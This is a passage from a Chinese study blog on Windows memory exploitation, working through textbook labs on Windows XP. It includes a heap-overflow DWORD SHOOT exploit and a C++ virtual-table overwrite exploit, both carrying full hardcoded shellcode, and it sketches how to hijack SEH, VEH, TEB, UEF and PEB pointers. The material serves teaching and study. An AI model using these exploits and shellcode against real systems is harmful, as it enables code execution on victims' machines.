class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block </span></span><br><span class="line"><span class="string">&quot;\x88\x06\x36\x00&quot;</span><span class="comment">//0x00360688 is the address of shellcode in first</span></span><br><span class="line">					<span class="comment">//Heapblock</span></span><br><span class="line"><span class="string">&quot;\xF0\xFE\x12\x00&quot;</span>;<span class="comment">//target of DWORD SHOOT</span></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>);<span class="comment">// over flow here, noticed 0x200 means</span></span><br><span class="line">	<span class="comment">//512 !</span></span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">// uesd to break the process</span></span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，在我在运行时，有问题，如下图<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419141859603.png" alt="image-20220419141859603"></p><p>这里执行了未知指令，也就是<code>F0:FE</code> ，查看内存可以发现，在地址<code>0x0036068C</code>处我们的 shellcode 已经被修改为了<code>F0 FE 12 00</code>。<br>这就是 DWORD SHOOT 后的 “指针反射” 现象，在双向链表拆除时第二次链表操作导致了 DWORD SHOOT。DWORD SHOOT 把目标地址 <code>0012FEFO</code> 写回 shellcode 起始位置偏移 4 个字节的地方 <code>0036068c</code>。</p><p>这里我们把 <code>F0 FE 12 00</code>修改为 <code>EB 02 12 00</code>（这里只要能够跳转后一条指令就行），使得 EIP 跳到了0x00360690处开始执行从而避免了指针反射造成的错误，如下图<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419143637686.png" alt="image-20220419143637686"></p><h2 id="深入挖掘-windows-异常处理"><a class="markdownIt-Anchor" href="#深入挖掘-windows-异常处理"></a> 深入挖掘 Windows 异常处理</h2><p><strong>（1）不同级别的 S.E.H</strong></p><p>异常处理的最小作用域是线程，每个线程都有自己的 S.E.H 链表。</p><p>异常处理流程 ：线程 —&gt; 进程 —&gt; 系统 —&gt; 终止</p><ul><li>首先执行线程中距离栈顶最近的 S.E.H 的异常处理函数。</li><li>若失败，则依次尝试执行 S.E.H 链表中后续的异常处理函数。</li><li>若 S.E.H 链中所有的异常处理函数都没能处理异常，则执行进程中的异常处理。</li><li>若仍然失败，系统默认的异常处理将被调用，其结果是显示错误对话框。</li></ul><p><strong>（2）线程的异常处理</strong></p><p>线程中异常处理的回调函数的<strong>参数</strong>和<strong>返回值</strong>（回调函数执行前，操作系统将断点信息压栈）：</p><ul><li><p>参数</p><ul><li><p><strong>pExcept</strong>：指向一个结构体 <strong>EXCEPTION_RECORD</strong>。该结构体包含了若干<br>与异常相关的信息，如异常的类型、异常发生的地址等。</p></li><li><p><strong>pFrame</strong>：指向栈帧中的 <strong>S.E.H</strong> 结构体。</p></li><li><p><strong>pContext</strong>：指向 <strong>Context</strong> 结构体。该结构体中包含了所有寄存器的状态。</p></li><li><p><strong>pDispatch</strong>：未知用途。</p></li></ul></li><li><p>返回值</p><ul><li><strong>0</strong> (ExceptionContinueExcetution)：代表<strong>异常处理成功</strong>，将返回原程序发生异常的地方，继续执行。</li><li><strong>1</strong> (ExceptinoContinueSearch)：代表<strong>异常处理失败</strong>，将顺着 S.E.H 链表搜索其它可用于异常处理的函数并尝试处理。</li></ul></li></ul><p>线程的异常处理中还有一个叫 <strong>unwind 操作</strong>。</p><p>unwind 定义：在异常发生时，系统会顺着 S.E.H链表搜索能处理异常的句柄；一旦找到，系统会把已经遍历过的异常处理函数再调用一遍，这个过程就是 unwind 操作，第二轮调用就是 unwind 调用。</p><p>unwind 目的：”通知“ 前面处理异常失败的 S.E.H 释放资源，之后这些 S.E.H 结构体将被从链表中拆除。进而避免进行多次异常处理。</p><p>unwind 操作确保了异常处理机制自身的完整性和正确性。下图是一个没有使用 unwind 操作而导致异常处理机制自身产生错误的例子。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220421223548497.png" alt="image-20220421223548497"></p><p>异常处理函数第一轮调用，用来处理异常，第二轮的 unwind 调用时，释放资源。那么异常回调函数怎么直到自己是第几轮调用呢？</p><p>答案在回调函数的第一个参数 pExcept 所指向的 EXCEPTION_RECORD 结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">	DWORD ExceptionCode;</span><br><span class="line">	DWORD ExceptionFlags; <span class="comment">//异常标志位</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">	PVOID ExceptionAddress;</span><br><span class="line">	DWORD NumberParameters;</span><br><span class="line">	DWORD ExceptionInformation [EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><p>当 ExceptionCode = 0xC0000027(STATUS_UNWIND)，ExceptionFlags = 2(EH_UNWINDING) 时，对回调函数的调用就属于 unwind 调用。</p><p>unwind 操作通过 kernerl.32 中的一个导出函数 RtlUnwind 实现，实际上 kernel32.dll 会转而再去调用 ntdll.dll 中的同名函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">RtlUnwind</span><span class="params">(</span></span><br><span class="line"><span class="params">	PVOID TargetFrame,</span></span><br><span class="line"><span class="params">	PVOID TargetIp,</span></span><br><span class="line"><span class="params">	PEXCEPTION_RECORD ExceptionRecord,</span></span><br><span class="line"><span class="params">	PVOID ReturnValue</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>**补充：**在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。</p></blockquote><p><strong>（3）进程的异常处理</strong></p><p>进程的异常处理回调函数需要通过 API 函数 SetUnhandledExceptionFilter 来注册 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LPTOP_LEVEL_EXCEPTION_FILTER <span class="title function_">SetUnhandledExceptionFilter</span><span class="params">(</span></span><br><span class="line"><span class="params">LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p><strong>提示：</strong> 您可以简单地把线程异常处理对应为代码中的__try{} __ except(){}或者 Assert等语句，把进程的异常处理对应于函数 SetUnhandledExceptionFilter。</p></blockquote><p>进程的异常处理函数的<strong>返回值</strong>：</p><ul><li><strong>1</strong>（ EXCEPTION_EXECUTE_HANDLER）：表示错误得到正确的处理，程序将退出。</li><li><strong>0</strong>（ EXCEPTION_CONTINUE_SEARCH）：无法处理错误，将错误转交给系统默认的异常处理。</li><li><strong>-1</strong>（ EXCEPTION_CONTINUE_EXECUTION）：表示错误得到正确的处理，并将继续执行下去。类似于线程的异常处理，系统会用回调函数的参数恢复出异常发生时的断点状况，但这时引起异常的寄存器值应该已经得到了修复。</li></ul><p><strong>（4）系统默认的异常处理 U.E.F</strong></p><p>系统默认的异常处理函数 UnhandledExceptionFilter()，简称 【U.E.F】UnhandledExceptionFilter() 将首先检查注册表 HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AeDebug 下的表项，如下图所示。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220421231555943.png" alt="image-20220421231555943"></p><p>路径下的 <strong>Auto</strong> 表项代表<strong>是否弹出错误对话框</strong>，值为 1 表示不弹出错误对话框直接结束程序，其余值均会弹出提示错误的对话框。<br>注册表的 Debugger 指明了系统默认的调试器，在错误框弹出后，如果您选择调试，UnhandledExceptionFilter 就会按照这里的命令加载相应的调试器。</p><p><strong>（5）异常处理流程的总结</strong></p><p>windows 2000 异常处理的<strong>基本流程</strong>：</p><ul><li>CPU 执行时发生并捕获异常，内核接过进程的控制权，开始内核态的异常处理。</li><li>内核异常处理结束，将控制权还给 ring3。</li><li>ring3 中第一个处理异常的函数是 ntdll.dll 中的 KiUserExceptionDispatcher()函数。</li><li>KiUserExceptionDispatcher()首先<strong>检查</strong>程序是否处于<strong>调试状态</strong>。如果程序正在被调试，会将异常交给调试器进行处理。</li><li>在非调试状态下，KiUserExceptionDispatcher() 调用 RtlDispatchException()函数<strong>对线程的 S.E.H 链表进行遍历</strong>，如果找到能够处理异常的回调函数，将再次遍历先前调用过的 S.E.H 句柄，即 unwind 操作，以保证异常处理机制自身的完整性。</li><li>如果栈中所有的 S.E.H 都失败了，且用户曾经使用过 SetUnhandledExceptionFilter()函数设定进程异常处理，则这个异常处理将被调用，即<strong>调用用户自定义进程异常处理函数</strong>。</li><li>如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么<strong>系统默认的异常处理 UnhandledExceptionFilter()将被调用</strong>。 U.E.F 会根据注册表里的相关信息决定是默默地关闭程序，还是弹出错误对话框。</li></ul><h2 id="其它异常处理机制的利用思路"><a class="markdownIt-Anchor" href="#其它异常处理机制的利用思路"></a> 其它异常处理机制的利用思路</h2><h3 id="veh-利用"><a class="markdownIt-Anchor" href="#veh-利用"></a> V.E.H 利用</h3><p>从 Windows XP 开始，在原来的异常处理机制上增加了一种<strong>新的异常处理</strong>：<strong>V.E.H</strong> ( Vectored Exception Handler，<strong>向量化异常处理</strong> )。</p><p><strong>V.E.H 要点：</strong></p><p>（1）V.E.H 使用 API 注册回调函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PVOID <span class="title function_">AddVectoredExceptionHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">	ULONG FirstHandler,</span></span><br><span class="line"><span class="params">	PVECTORED_EXCEPTION_HANDLER VectoredHandler</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>（2）V.E.H 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">VECTORED_EXCEPTION_NODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	DWORD m_pNextNode;</span><br><span class="line">	DWORD m_pPreviousNode;</span><br><span class="line">	PVOID m_pfnVectoredHandler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）可以注册多个 V.E.H，V.E.H结构体间串成双向链表，保存在堆中。</p><p>（4）调用顺序：KiUserExceptionDispatcher() 首先检查是否被调试，然后检查 V.E.H 链表，最后检查 S.E.H 链表。</p><p>（5）注册 V.E.H 时，可以指定其在链表中的位置，不必像 S.E.H 按照注册顺序压栈。</p><p>（6）unwind 操作只对栈帧中的 S.E.H链起作用，不涉及 V.E.H</p><p>**V.E.H 利用思路：**如果能用堆溢出的 DWORD SHOOT 修改指向 V.E.H 头结点的指针，在异常处理开始后，就能引导程序执行 shellcode 了。</p><p><strong>标识 V.E.H 链表头节点的指针位于 <code>0x77FC3210</code></strong></p><h3 id="攻击-teb-中的-seh-头节点"><a class="markdownIt-Anchor" href="#攻击-teb-中的-seh-头节点"></a> 攻击 TEB 中的 S.E.H 头节点</h3><p>**攻击思路：**线程的 S.E.H 链通过 TEB 的第一个 DWORD 标识(fs:0)，这个指针永远指向离栈顶最近的那个 S.E.H。如果能够修改 TEB 中的这个指针，在异常发生时就能将程序引导到 shellcode 中去执行。</p><p><strong>TEB（线程环境块）要点：</strong></p><p>（1）一个进程可能同时存在多个线程。</p><p>（2）每个线程都有一个线程环境块 TEB。</p><p>（3）第一个 TEB 开始于 <code>0x7FFDE000</code>。</p><p>（4）之后新建线程的 TEB 紧随前边的 TEB ，相隔 <code>0x1000</code>字节，并向内存低址方向增长。</p><p>（5）当线程退出时，对应的 TEB 也被销毁，腾出的 TEB 空间可以被新建的线程重复使用。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220423170845384.png" alt="image-20220423170845384"></p><p>攻击 TEB 中 S.E.H 头节点的方法一般用于单线程的程序，不适合攻击多线程的程序，是因为，多线程的 TEB 很难判断到底是哪一个线程的。</p><h3 id="攻击uef"><a class="markdownIt-Anchor" href="#攻击uef"></a> 攻击U.E.F</h3><p>U.E.F【UnhandledExceptionFilter()】即系统默认的异常处理函数，是系统处理异常的最后一个环节。</p><p>由于 U.E.F 句柄在不同操作系统和补丁版本下可能不同，所以在攻击前需要确定 U.E.F 句柄，即反汇编（用IDA）kernel32.dll 中的导出函数 SetUnhandledExceptionFilter()。</p><p>补充：U.E.F 利用时，结合使用跳板技术能使 exploit 成功率更高。</p><p>异常发生时，EDI 往往仍然指向堆中离 shellcode 不远处，把 U.E.F 的句柄覆盖成一条 <code>call dword ptr [edi+0x78]</code>的指令地址往往能让程序跳到 shellcode 中。其它具有定位 shellcode 的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call dword ptr [ESI+0x4C]</span><br><span class="line">call dword ptr [EBP+0x74]</span><br></pre></td></tr></table></figure><p>此外，EDI的跳转并不能保证百分之百成功。</p><h3 id="攻击-peb-中的函数指针"><a class="markdownIt-Anchor" href="#攻击-peb-中的函数指针"></a> 攻击 PEB 中的函数指针</h3><p><strong>PEB 的位置永远不变。</strong></p><p>上一次堆溢出的最后一个实验中，通过 DWORD SHOOT 修改 PEB 中函数地址，那么当调用函数时，程序就被我们引导去执行 shellcode 代码。</p><h1 id="off-by-one-的利用"><a class="markdownIt-Anchor" href="#off-by-one-的利用"></a> “off by one” 的利用</h1><p>Halvar Flake 在“ Third Generation Exploitation”中，按照攻击的难度把漏洞利用技术分成 3个层次。<br>（ 1）第一类是<strong>基础的栈溢出利用</strong>。攻击者可以利用返回地址等轻松劫持进程，植入 shellcode，例如，对 strcpy、 strcat 等函数的攻击等。<br>（ 2）第二类是<strong>高级的栈溢出利用</strong>。这时，栈中有诸多的限制因素，溢出数据往往只能淹没部分的 EBP，而无法抵达返回地址的位置。这种漏洞利用的典型例子就是对 strncpy 函数误用时产生的 “off by one” 漏洞的利用。<br>（ 3）第三类攻击则是<strong>堆溢出利用及格式化串漏洞的利用</strong>。</p><p>off by one 的利用代码示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">off_by_one</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="type">int</span> i=<span class="number">0</span>,len=<span class="number">0</span>;</span><br><span class="line">	len=<span class="keyword">sizeof</span>(buf);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; input[i]&amp;&amp;(i&lt;=len); i++) <span class="comment">//这里应该是i&lt;len</span></span><br><span class="line">	&#123;</span><br><span class="line">		buf[i]=input[i];</span><br><span class="line">	&#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第 6 行代码中，循环条件中的<code>i&lt;=len</code>就给攻击者一个字节的溢出机会。这种边界控制上的错误就是 “off by one” 问题。</p><p>这时，如果缓冲区后面紧跟着 EBP 和返回地址，那么这溢出的一个字节，将有机会覆盖 EBP 的最低位字节，也就是说我们能在255个字节的范围内移动 EBP，让程序执行我们指定位置的恶意代码。</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419215423173.png" alt="image-20220419215423173"></p><p>此外，off by one 可能破坏重要的临界变量，从而导致程序流程改变，或者整数溢出等更深层次的问题。</p><h1 id="攻击-c-的虚函数"><a class="markdownIt-Anchor" href="#攻击-c-的虚函数"></a> 攻击 C++ 的虚函数</h1><p>虚函数与虚表的要点：<br>（ 1）用关键字 virtual 修饰声名的类成员函数，叫虚函数</p><p>​	（ 2）一个类用可能有多个虚函数</p><p>​	（ 3）虚表（vatable）中保存着类的所有虚函数的入口地址。</p><p>​	（ 4）对象使用虚函数时，先通过虚表指针找到虚表，然后从虚表中找到虚函数的入口地址。</p><p>​	（ 5）虚表指针保存在对象的内存空间中，与其它成员变量相邻。</p><p>​	（ 6）虚函数只有通过对象指针的引用才能显示其动态调用的特性。</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419215625216.png" alt="image-20220419215625216"></p><p>如果能<strong>溢出</strong>对象的<strong>成员变量</strong>，就有机会修改<strong>虚表指针</strong>或修改虚表中的<strong>虚函数指针</strong>，从而运行 shellcode</p><h2 id="实现代码即相关说明"><a class="markdownIt-Anchor" href="#实现代码即相关说明"></a> 实现代码即相关说明</h2><p>表 6-3-1 实验环境</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP2</td><td>其他 Win32 操作系统也可进行本实验</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><p>说明： 伪造的虚表指针和虚函数指针依赖于实验机器，可能需要通过动态调试重新确定，您也可以通过在程序中简单地打印出 overflow.buf 的地址，从而计算出这两个值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\xE2\x42\x00&quot;</span>;<span class="comment">//set fake virtual function pointer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Failwest</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">Failwest overflow, *p;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> * p_vtable;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,overflow.buf);</span><br><span class="line">	p_vtable=overflow.buf<span class="number">-4</span>;<span class="comment">//point to virtual table</span></span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line">	<span class="comment">//the address may need to ajusted via runtime debug</span></span><br><span class="line">	p_vtable[<span class="number">0</span>]=<span class="number">0xf4</span>;</span><br><span class="line">	p_vtable[<span class="number">1</span>]=<span class="number">0xe2</span>;</span><br><span class="line">	p_vtable[<span class="number">2</span>]=<span class="number">0x42</span>;</span><br><span class="line">	p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line">	<span class="built_in">strcpy</span>(overflow.buf,shellcode);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">	p=&amp;overflow;</span><br><span class="line">	p-&gt;<span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>代码说明：</strong><br>（ 1）虚表指针位于 char buf[200] 之前，通过 p_vtable = overflow.buf - 4 定位这个指针。</p><p>​	（ 2）修改<strong>虚表指针</strong>指向缓冲区的 <code>0x0042e2f4</code> 处，把<code>0x0042e2f4</code>里存放的内容当作<strong>虚函数指针</strong>，即<code>0042e244</code></p><p>​	（ 3）程序执行到 p-&gt;rest() 时，将会把<code>0x0042e2f4</code>处的内容取出，即 <code>0x0042e244</code> ，然后把它当作函数的入口地址，进而去执行 <code>0x0042e244</code> 处的指令，即我们的 shellcode 代码。</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419221608706.png" alt="image-20220419221608706"></p><p>运行程序后出现的结果：</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220420100115219.png" alt="image-20220420100115219"></p><p>由于虚表指针位于成员变量前，溢出只能向后覆盖数据，所以这种利用方式在 “数组溢出”或“连续性覆盖” 